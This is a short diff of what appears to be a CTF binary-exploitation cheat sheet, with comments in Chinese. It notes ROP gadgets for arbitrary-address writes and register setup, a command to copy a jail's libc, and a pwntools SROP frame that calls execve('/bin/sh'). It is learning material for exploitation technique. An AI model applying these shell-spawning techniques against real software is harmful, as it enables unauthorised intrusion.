@@ -61,8 +61,8 @@ shellcode = asm(shellcraft.amd64.linux.sh())
 """
 
 # magic gadget
-# 0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
-
+add dword ptr [rbp - 0x3d], ebx ; nop ; ret     # 任意地址写操作
+add edx, eax; mov rax, rdx; pop rbx; ret        # 没有pop rdx时，给rdx赋值，libc中含有            
 
 # copy jail libc
 sudo docker cp xx:/srv/usr/lib64/ld-linux-x86-64.so.2 ./
@@ -83,12 +83,10 @@ if "pow" in sys.argv:
 
 
 # SROP
-```
 frame = SigreturnFrame()
-frame.rdi = 0x4048f4
+frame.rdi = 0x4048f4  # /bin/sh
 frame.rsi = 0
 frame.rdx = 0
 frame.rax = constants.SYS_execve
 frame.rsp = syscall
 frame.rip = ret
-```
